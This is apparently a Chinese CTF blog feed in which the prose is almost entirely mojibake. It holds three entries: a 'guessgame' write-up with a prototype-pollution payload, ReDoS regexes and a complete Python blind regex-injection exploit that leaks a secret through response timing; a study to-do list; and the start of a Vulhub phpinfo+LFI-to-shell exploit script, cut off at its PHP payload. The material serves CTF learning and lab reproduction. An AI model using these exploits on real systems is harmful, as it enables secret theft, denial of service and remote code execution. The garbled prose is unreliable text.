¹ç›®å½•â€¦â€¦<br>éƒå¸ˆå‚…æœ€åä¹Ÿè·Ÿæˆ‘è¯´è¿™ä¸ªæ€è·¯ï¼Œæˆ‘å¼€å§‹è¿˜ä¸æ•¢ä¿¡ã€‚ç»“æœçœŸèƒ½æ•´æˆéé¢„æœŸã€‚å¯æƒœåæ¥è¢«ä¿®å¤äº†ã€‚</p><p>ä¸è¯´äº†ï¼Œæ¯”èµ›æ²¡åšå‡ºæ¥å¤ªé—æ†¾äº†ã€‚æœ‰å¤ç°ç¯å¢ƒçš„è¯ä¸€å®šå»å¤ç°ã€‚</p><h1 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h1><p>å…ˆæ‰”ä¸€ä¸ªæºç å®¡å®Œå°±å‡ºçš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;user&quot;: &#123;&quot;username&quot;:&quot;admÄ±n888&quot;, &quot;__proto__&quot;: &#123;&quot;enableReg&quot;: True&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯ä¸€ä¸ªjså¤§å†™çš„ç»•è¿‡ï¼Œä¸Šæ¬¡å…¬ç›ŠCTFåšè¿‡äº†ã€‚ç„¶åæ˜¯ä¸€ä¸ªè°ƒç”¨äº†mergeçš„åŸå‹é“¾æ±¡æŸ“ã€‚ä¹Ÿæ˜¯ä¸ºäº†è¿›ä¸‹é¢è¿™ä¸ªifã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123;</span><br><span class="line">            <span class="comment">//res.end(flag);</span></span><br><span class="line">            <span class="comment">//Stop your wishful thinking and go away!</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>åé¢è¦è·‘flagï¼Œç”¨çš„æ˜¯æ­£åˆ™ç›²æ³¨ã€‚<br>æ‰“æ‰°äº†ï¼Œç¯å¢ƒä¸€ä¸ªä¸ªå¡çš„ä¸€æ¯”ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ³¨ï¼Œ<del>ç­‰ä¸€æ‰‹å®˜æ–¹wpå§ã€‚</del><br>çœ‹åˆ°åˆ«é˜Ÿæ€è·¯äº†ï¼Œå¯ä»¥å­¦ä¸‹ã€‚åŸæ¥noDosè¿™ä¸ªæ­£åˆ™å°±æ˜¯è¦åˆ©ç”¨çš„ã€‚å› ä¸ºæ˜¯ä¸ªæ­£åˆ™åŒ¹é…ï¼Œè€Œjavascriptæ­£åˆ™çš„å›æº¯æœºåˆ¶ä¼šè®©æ¶æ„ä»£ç ä½¿æœåŠ¡ç«¯å¤§é‡å ç”¨æœåŠ¡å†…å­˜ã€‚æ¯”å¦‚ä¸€ä¸ª<code>/Ë†a*a*b$/</code>ï¼Œç”¨<code>aaaaaaaaaaaaa</code>å°±å¯ä»¥è®©å…¶å¤šæ¬¡å›æº¯ï¼Œè¾¾æˆjsçš„re(æ­£åˆ™)dosæ”»å‡»ã€‚<br>æ‰€ä»¥æœ¬é¢˜ç›®çš„å°±æ˜¯è®©nodosè¢«æˆ‘ä»¬çš„å¯æ§qå¡ä½ï¼Œç„¶åå‰é¢å·²ç»åŸå‹é“¾æ±¡æŸ“è¾¾æˆifçš„ä¸€ä¸ªçœŸå€¼äº†ï¼Œå‰©ä¸‹çš„ç›¸å½“äºç›²æ³¨flagä½¿ifç¬¬ä¸‰ä¸ªå€¼è¾¾æˆçœŸå€¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â g3t(((((.*)+)+)+)+)!Â </span><br><span class="line">(((((.*)+)+)+)+)Y</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼å¦‚æ­¤çš„payloadä¸æ–­fuzzã€‚</p><p>3.13ï¼š<br>ä»Šå¤©æŠŠé¢˜ç›®å¤ç°äº†ä¸€ä¸‹ï¼Œç”¨çš„å‡ºé¢˜äººçš„è„šæœ¬åšäº†åšã€‚é¡ºä¾¿ç†è§£äº†ä¸‹reDOSç›²æ³¨çš„åŸºæœ¬æ¦‚å¿µã€‚å½“ç„¶è¦è·Ÿå‡ºé¢˜äººç‚¹èµï¼Œè¿™é¢˜ç®—æ˜¯å¤´ä¸€æ¬¡è€ƒå¯Ÿäº†reDOSçš„çŸ¥è¯†ç‚¹ï¼Œå¯æƒœå› ä¸ºé¶æœºåŸå› ä¸èƒ½ä¿è¯é€‰æ‰‹ä»¬æ­£å¸¸è§£é¢˜ã€‚å¦‚æœå•ç‹¬ä¸‹å‘å®¹å™¨åº”è¯¥ä¼šæ›´ç¨³å®šã€‚<br>å…³äºçŸ¥è¯†ç‚¹:<br>è¯´èµ·æ¥å…¶å®ä¸éš¾ã€‚reDOSé¦–å…ˆéœ€è¦æ˜ç¡®çš„æ˜¯ï¼šä½¿ç”¨äº†jsçš„NFAä½œä¸ºæ­£åˆ™å¼•æ“ã€‚NFAï¼Œå³éç¡®å®šæœ‰é™çŠ¶æ€è‡ªåŠ¨æœºã€‚å…¶å®ï¼Œä¹‹å‰åœ¨pç‰›çš„pcrewafè¿™ä¸€é¢˜ç›®ä¸­å°±å·²ç»æåŠäº†NFAçš„ç‰¹æ€§ã€‚å®ƒæ­£åˆ™åŒ¹é…æ—¶å‡ºç°çš„å›æº¯æœºåˆ¶å°†ä¼šäº§ç”Ÿå¤§é‡å±å®³ã€‚å¯¹phpè€Œè¨€æ˜¯å›æº¯æ¬¡æ•°æœ‰é™å¯¼è‡´bypassã€‚å¯¹ä½œä¸ºæœåŠ¡ç«¯çš„jsè€Œè¨€ï¼Œåˆ™æ˜¯å ç”¨å¤§é‡ç³»ç»Ÿèµ„æºã€‚ä¹‹å‰æ›¾çœ‹åˆ°å›½å¤–å¤§ä½¬å†™çš„ä¸€ä¸ªæ­£åˆ™ï¼Œå¯ä»¥è®©ä¸€æ¬¡jsçš„æ­£åˆ™åŒ¹é…å ç”¨é«˜è¾¾%99çš„å†…å­˜ã€‚</p><p>å›åˆ°è¿™ä¸€çŸ¥è¯†ç‚¹ï¼Œæ¥çœ‹è§£é¢˜çš„ä¸»è¦æ­£åˆ™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(?&#x3D;(some regexp here))((.*)*)*salt$</span><br></pre></td></tr></table></figure><p>ç®€å•è§£é‡Šï¼Œåªè¦æˆ‘ä»¬æ‰€éœ€è¦çš„SECRET(æœ¬é¢˜æ˜¯flag)ä¸ä¸­é—´çš„regexpéƒ¨åˆ†ç›¸åŒ¹é…ï¼Œæ•´ä¸ªæ­£åˆ™å°†å¯¼è‡´æ•´ä¸ªåŒ¹é…è¿‡ç¨‹å»¶æ—¶åˆ°2ç§’å¤šçš„æ—¶é—´ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œåªè¦èƒ½é€šè¿‡æ„é€ æ­£åˆ™è¡¨è¾¾å¼æ¥æ³¨å…¥ï¼Œå°†è¾¾åˆ°è·Ÿsqlæ—¶é—´ç›²æ³¨ä¸€æ ·çš„æ•ˆæœï¼Œå¾—åˆ°è¿›è¡Œæ­£åˆ™åŒ¹é…çš„flag<br>é™„ä¸Šå‡ºé¢˜äººçš„exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># constants</span></span><br><span class="line">THRESHOLD = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># predicates</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">length_is</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">".&#123;"</span> + str(n) + <span class="string">"&#125;$"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nth_char_is</span><span class="params">(n, c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">".&#123;"</span> + str(n<span class="number">-1</span>) + <span class="string">"&#125;"</span> + re.escape(c) + <span class="string">".*$"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># utilities</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redos_if</span><span class="params">(regexp, salt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"^(?=&#123;&#125;)((((.*)*)*)*)*&#123;&#125;"</span>.format(regexp, salt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_request_duration</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _start = time.time()</span><br><span class="line">        requests.post(<span class="string">"http://vps:port/verifyFlag"</span>, &#123;<span class="string">"q"</span>: payload&#125;)</span><br><span class="line">        _end = time.time()</span><br><span class="line">        duration = _end - _start</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        duration = <span class="number">-1</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> duration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prop_holds</span><span class="params">(prop, salt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> get_request_duration(redos_if(prop, salt)) &gt; THRESHOLD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_salt</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    salt = <span class="string">"!"</span>  <span class="comment"># generate_salt()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak length</span></span><br><span class="line">    upper_bound = <span class="number">15</span></span><br><span class="line">    secret_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, upper_bound):</span><br><span class="line">        <span class="keyword">if</span> prop_holds(length_is(i), salt):</span><br><span class="line">            secret_length = i</span><br><span class="line">    print(<span class="string">"[+] length: &#123;&#125;"</span>.format(secret_length))</span><br><span class="line"></span><br><span class="line">    S = <span class="string">"qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890"</span></span><br><span class="line">    secret = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, secret_length):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">if</span> prop_holds(nth_char_is(i+<span class="number">1</span>, c), salt):</span><br><span class="line">                secret += c</span><br><span class="line">                print(<span class="string">"[*] &#123;&#125;"</span>.format(secret))</span><br><span class="line">    print(<span class="string">"[+] secret: &#123;&#125;"</span>.format(secret))</span><br></pre></td></tr></table></figure><p>å‚è€ƒäº†å‡ºé¢˜äººçš„å‚è€ƒæ–‡ç« ï¼š<a href="https://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg</a> </p><p>æ¯”èµ›å…¶ä»–é¢˜ç›®ä¸»è¦æ˜¯é˜Ÿå‹åšçš„ï¼ŒåŸºæœ¬æ²¡æ€ä¹ˆçœ‹ã€‚åˆ°æ—¶å€™æœ‰æœºä¼šå»ç ”ç©¶ä¸‹ã€‚<br>ç„¶åå°±æ˜¯åæ€äº†ã€‚ç°åœ¨æ°´å¹³è¿˜å¤ªèœï¼Œèµ¶ç´§å¤šèŠ±ç‚¹æ—¶é—´å­¦å­¦çŸ¥è¯†åˆ·åˆ·é¢˜ã€‚ä¸ç„¶å†èœçš„æŠ è„šå°±ä¸¢äººäº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>To-Dolist</title>
      <link href="2020/03/09/To-Dolist/"/>
      <url>2020/03/09/To-Dolist/</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡ XCTF å°±è‡ªé—­äº†ã€‚æœ€éš¾å—çš„å°±æ˜¯é˜Ÿå‹è¾›è‹¦ä»˜å‡ºï¼Œè‡ªå·±å´åŸºæœ¬æ²¡å•¥è¾“å‡ºâ€¦â€¦<br>ä¹‹å‰å…¬ç›Šèµ›è¿˜ä»¥ä¸ºæœ‰äº†ä¸€å®šæ°´å‡†ï¼Œç°åœ¨çœ‹è¿˜å·®å¾—è¿œå•Šã€‚<br>æ‰€ä»¥ä¸€å®šè¦ä¸€å®šè¦å°½å¿«æŠŠèƒ½åŠ›æå‡èµ·æ¥ï¼Œåˆ·é¢˜å›ºç„¶é‡è¦ï¼ŒçŸ¥è¯†ç‚¹ä¹Ÿä¸èƒ½è½ä¸‹ã€‚<br>è¿™æ¬¡æ¯”èµ›æ‰“ä¸‹æ¥å‘ç°è‡ªå·±å±…ç„¶åªèƒ½åœ¨sqlè·ŸNode.jsä¸‹æ‰‹ï¼Œå¤ªå˜²è®½äº†ã€‚<br>æŠŠè¿‘æœŸä¸€äº›éœ€è¦å½»åº•å¼„æ‡‚çš„çŸ¥è¯†ç‚¹åˆ—ä¸€ä¸‹ï¼Œæ€»æœ‰ä¸€å¤©è¦å…¨éƒ¨è§£å†³ã€‚</p><a id="more"></a><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="phpçš„ä¸€äº›trick"><a href="#phpçš„ä¸€äº›trick" class="headerlink" title="phpçš„ä¸€äº›trick"></a>phpçš„ä¸€äº›trick</h2><p><del>å†™shell;<br>å‘½ä»¤æ‰§è¡Œ;</del><br><del>bypassæŠ€å·§</del></p><h2 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h2><p><del>ä¸»è¦æ˜¯popé“¾çš„æ„é€ ã€‚<br>ç®€å•çš„å½“ç„¶ä¼šã€‚éš¾çš„å°±å®¹æ˜“æ‹‰èƒ¯ã€‚è¯´ç™½äº†å°±æ˜¯è‡ªå·±å®¡è®¡èƒ½åŠ›å·®ã€‚<br>æœ€å¥½æŠŠtrickéƒ½ææ¸…æ¥šã€‚<br>ç„¶åå†æŠŠä¸‹é¢çš„æ¡†æ¶çš„popé“¾å¼„ä¸€å¼„</del></p><h2 id="tpæ¡†æ¶5-0-6-0"><a href="#tpæ¡†æ¶5-0-6-0" class="headerlink" title="tpæ¡†æ¶5.0 6.0"></a>tpæ¡†æ¶5.0 6.0</h2><h2 id="Laravelæ¡†æ¶"><a href="#Laravelæ¡†æ¶" class="headerlink" title="Laravelæ¡†æ¶"></a>Laravelæ¡†æ¶</h2><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="pythonååºåˆ—åŒ–"><a href="#pythonååºåˆ—åŒ–" class="headerlink" title="pythonååºåˆ—åŒ–"></a>pythonååºåˆ—åŒ–</h2><p><del>è¿™æ¬¡ååºåˆ—åŒ–åƒäº†å¤§äºã€‚ç°å­¦éƒ½å¥½å¤šçœ‹ä¸è¿›å»ã€‚æ—¢ç„¶å¦‚æ­¤é‚£å°±åŠ›æ±‚çº¿ä¸‹å¼„æ˜ç™½ã€‚<br>ä¸»è¦æ˜¯åº•å±‚çš„åŸç†</del></p><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p><del>æ¡†æ¶é—®é¢˜ã€‚æƒ³åšè¿˜æ˜¯å¾—ä¼šå¼€å‘ã€‚</del></p><h2 id="å¼€å‘çš„"><a href="#å¼€å‘çš„" class="headerlink" title="å¼€å‘çš„"></a>å¼€å‘çš„</h2><p>å¤šçº¿ç¨‹ä»€ä¹ˆçš„ã€‚<br>å†™è„šæœ¬çœæ—¶é—´ã€‚<br><del>py3è·Ÿpy2ä¸€äº›è„šæœ¬çš„å·®åˆ«</del></p><h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="javaååºåˆ—åŒ–"><a href="#javaååºåˆ—åŒ–" class="headerlink" title="javaååºåˆ—åŒ–"></a>javaååºåˆ—åŒ–</h2><p>å¥½æ­¹è‡ªå·±æœ‰javaåŸºç¡€ã€‚ä¸æ¥è§¦ä¸‹javaæ¼æ´å¤ªæµªè´¹é‚£ä¸€ç‚¹javaçŸ¥è¯†äº†ã€‚</p><h2 id="spelæ³¨å…¥"><a href="#spelæ³¨å…¥" class="headerlink" title="spelæ³¨å…¥"></a>spelæ³¨å…¥</h2><h2 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h2><p>tomcat </p><h1 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h1><h2 id="xss-csp"><a href="#xss-csp" class="headerlink" title="xss csp"></a>xss csp</h2><p><del>è€æ—©çœ‹è¿‡æ¯”è¾ƒå®Œæ•´çš„å´æ²¡æ€»ç»“ã€‚èµ¶ç´§æ€»ç»“ä¸€æ³¢ã€‚</del></p><h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><p>å”¯ä¸€æ¯”è¾ƒè‡ªä¿¡çš„ä¸€é¡¹ã€‚<br>ç»“æœæ¯”èµ›ç¬¬ä¸€é¢˜è¿˜æ˜¯ä¸ä¼šåšã€‚<br>ä¸‡èƒ½å¯†ç ä¹Ÿå·®ç‚¹æ²¡å¼„å‡ºæ¥ã€‚</p><p>ä¹‹å‰æ€»ç»“çš„trickå¯èƒ½éœ€è¦å†ç»†åˆ†ä¸€ä¸‹ã€‚</p><h1 id="å…¶ä»–çš„"><a href="#å…¶ä»–çš„" class="headerlink" title="å…¶ä»–çš„"></a>å…¶ä»–çš„</h1><p>vulhubåœ¨å¤ç°äº†,äº‰å–å†å¤šå¤ç°ä¸€äº›é¢˜ç›®ã€‚</p><p>CSRFï¼ŒCRLFï¼Œäº‰å–å¤šæ‰¾äº›é¢˜ç›®åš;</p><p>æ¸—é€å­¦åˆ°çš„çŸ¥è¯†ä¹Ÿæ˜¯å¯ä»¥æ€»ç»“ä¸‹çš„<br>WEBè¿˜æœ‰å¥½å¤šåŸºç¡€æ²¡æ‰“ç‰¢ã€‚æ‰¾æ—¶é—´è¡¥ä¸€è¡¥ã€‚</p><p>å±¡è´¥å±¡æˆ˜æ‰æ˜¯ä¸€ä¸ªCTFerçš„ä½œé£ã€‚ç°åœ¨æ—¢ç„¶é€‰æ‹©è¿™æ¡è·¯å°±åŠ æ²¹å¹²ä¸‹å»å§ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulhubå¤ç°</title>
      <link href="2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>pç‰›å‚ä¸çš„é¡¹ç›®vulhub,å¯¹äºwebå®‰å…¨ä»äº‹äººå‘˜è€Œè¨€åº”è¯¥è¯´æ˜¯å®åº“èˆ¬çš„å­˜åœ¨ã€‚é‡Œé¢è®¸å¤šçš„æ¼æ´éƒ½æ˜¯å€¼å¾—ä¸€ä¸€å»å­¦ä¹ çš„ã€‚åœ¨æ­¤æ„Ÿè°¢é‚£äº›å¤§ä½¬ä¸ºé¡¹ç›®ä½œå‡ºçš„ä»˜å‡ºã€‚æ‰è®©æˆ‘ä»¬èƒ½å¤Ÿè½»æ¾å¤ç°é¢˜ç›®ã€‚<br>ç¯å¢ƒä»githubä¸Šè·å–ã€‚ç¯å¢ƒæ­å»ºåªéœ€<code>docker-compose up -d</code></p><a id="more"></a><h2 id="phpinfo-lfi-shell"><a href="#phpinfo-lfi-shell" class="headerlink" title="phpinfo+lfi=shell"></a>phpinfo+lfi=shell</h2><p>é¦–å…ˆè¯´æ˜ã€‚è¿™æ˜¯ä¸€ä¸ªæ— è§†phpç‰ˆæœ¬çš„æ¼æ´ã€‚å› æ­¤å¯è§å…¶é€šç”¨æ€§ã€‚vulhubä¸Šæä¾›çš„php7çš„ç¯å¢ƒï¼Œä»¥åŠä¸€ä¸ªlfi.phpé¡µé¢æ‰§è¡Œæ–‡ä»¶åŒ…å«ï¼Œä¸€ä¸ªphpinfo.phpæ‰§è¡Œphpinfoã€‚</p><p>æ¼æ´åŸç†ï¼š<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é¦–å…ˆï¼Œæ¼æ´çš„æ“ä½œé¡ºåºæ˜¯ï¼šè·å–phpinfoä¸­çš„ä¸´æ—¶æ–‡ä»¶å â€“&gt; å¯¹ä¸´æ—¶æ–‡ä»¶è¿›è¡ŒåŒ…å« â€“&gt; phpinfoé¡µé¢æ‰§è¡Œç»“æŸï¼Œé”€æ¯ä¸´æ—¶æ–‡ä»¶ã€‚<br>æ‰€ä»¥å¦‚æœæˆ‘ä»¬è®©phpinfoçš„æ‰§è¡Œæ—¶é—´è¶³å¤Ÿå¤§ï¼Œæˆ‘ä»¬çš„æ–‡ä»¶åŒ…å«å°±æœ‰è¶³å¤Ÿæ—¶é—´æ‰§è¡Œã€‚ä»è€Œäº§ç”Ÿä¸€ä¸ªæ°¸ä¹…çš„shellã€‚<br>æ‰€ä»¥åˆ©ç”¨æ—¶ï¼Œä½¿ç”¨çš„æ˜¯åŸç”Ÿçš„socketæ•°æ®ï¼Œå¾€phpinfoä¸­å¡«å……åƒåœ¾ä¿¡æ¯ã€‚phpçš„é»˜è®¤ç¼“å†²åŒºå¤§å°ä¸º4096ä¸ªå­—èŠ‚ï¼Œå°±ç›¸å½“äºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥ã€‚è¿™æ ·ï¼Œå½“æˆ‘ä»¬è·å–åˆ°ä¸´æ—¶æ–‡ä»¶åæ—¶ï¼Œå°±ç«‹å³å‘é€æ–‡ä»¶åŒ…å«è¯·æ±‚ã€‚å°±èƒ½æ‰§è¡Œå‘½ä»¤å¹¶å†™å…¥shelläº†ã€‚<br>ä½¿ç”¨vulhubä¸Šçš„expè„šæœ¬:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php 